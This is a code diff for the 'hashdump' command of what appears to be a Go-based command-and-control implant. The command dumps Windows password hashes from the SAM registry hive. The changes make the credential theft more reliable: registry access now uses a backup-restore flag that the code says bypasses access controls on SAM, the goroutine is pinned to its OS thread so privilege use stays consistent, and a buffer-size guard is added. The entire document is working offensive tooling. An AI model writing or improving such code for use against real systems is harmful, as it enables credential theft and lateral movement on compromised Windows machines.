@@ -8,6 +8,7 @@ import (
 	"encoding/json"
 	"fmt"
 	"os"
+	"runtime"
 	"strings"
 	"unsafe"
 
@@ -18,7 +19,7 @@ import (
 
 var (
 	advapi32HD           = windows.NewLazySystemDLL("advapi32.dll")
-	procRegCreateKeyExW  = advapi32HD.NewProc("RegCreateKeyExW")
+	procRegOpenKeyExW    = advapi32HD.NewProc("RegOpenKeyExW")
 	procRegQueryInfoKeyW = advapi32HD.NewProc("RegQueryInfoKeyW")
 	procRegQueryValueExW = advapi32HD.NewProc("RegQueryValueExW")
 	procRegEnumKeyExW    = advapi32HD.NewProc("RegEnumKeyExW")
@@ -46,6 +47,13 @@ type hashdumpArgs struct {
 }
 
 func (c *HashdumpCommand) Execute(task structs.Task) structs.CommandResult {
+	// Lock goroutine to OS thread — registry operations with SeBackupPrivilege
+	// require thread-level privilege consistency. Without this, Go's goroutine
+	// scheduler can migrate us to a different OS thread between privilege
+	// adjustment and registry access, causing silent failures or crashes.
+	runtime.LockOSThread()
+	defer runtime.UnlockOSThread()
+
 	var args hashdumpArgs
 	if task.Params != "" {
 		if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
@@ -118,25 +126,21 @@ func (c *HashdumpCommand) Execute(task structs.Task) structs.CommandResult {
 	return result
 }
 
-// regOpenKey opens a registry key using RegCreateKeyExW with REG_OPTION_BACKUP_RESTORE.
+// regOpenKey opens a registry key using RegOpenKeyExW with REG_OPTION_BACKUP_RESTORE.
 // This bypasses DACLs on restricted keys (like SAM) when SeBackupPrivilege is held.
+// Uses RegOpenKeyExW (not RegCreateKeyExW) to avoid write-lock contention on SAM/SECURITY hives.
 func regOpenKey(root uintptr, path string) (uintptr, error) {
 	pathPtr, _ := windows.UTF16PtrFromString(path)
 	var hKey uintptr
-	var disposition uint32
-	ret, _, err := procRegCreateKeyExW.Call(
+	ret, _, err := procRegOpenKeyExW.Call(
 		root,
 		uintptr(unsafe.Pointer(pathPtr)),
-		0, // Reserved
-		0, // Class (nil)
-		regOptionBackupRestore,
+		uintptr(regOptionBackupRestore),
 		uintptr(windows.KEY_READ),
-		0, // Security attributes (nil)
 		uintptr(unsafe.Pointer(&hKey)),
-		uintptr(unsafe.Pointer(&disposition)),
 	)
 	if ret != 0 {
-		return 0, fmt.Errorf("RegCreateKeyExW(%s): %v (code %d)", path, err, ret)
+		return 0, fmt.Errorf("RegOpenKeyExW(%s): %v (code %d)", path, err, ret)
 	}
 	return hKey, nil
 }
@@ -192,6 +196,10 @@ func regQueryValue(hKey uintptr, valueName string) ([]byte, error) {
 	)
 	if ret != 0 {
 		return nil, fmt.Errorf("RegQueryValueExW: %v (code %d)", err, ret)
+	}
+	// Guard against dataSize growing between calls (TOCTOU)
+	if dataSize > uint32(len(data)) {
+		dataSize = uint32(len(data))
 	}
 	return data[:dataSize], nil
 }
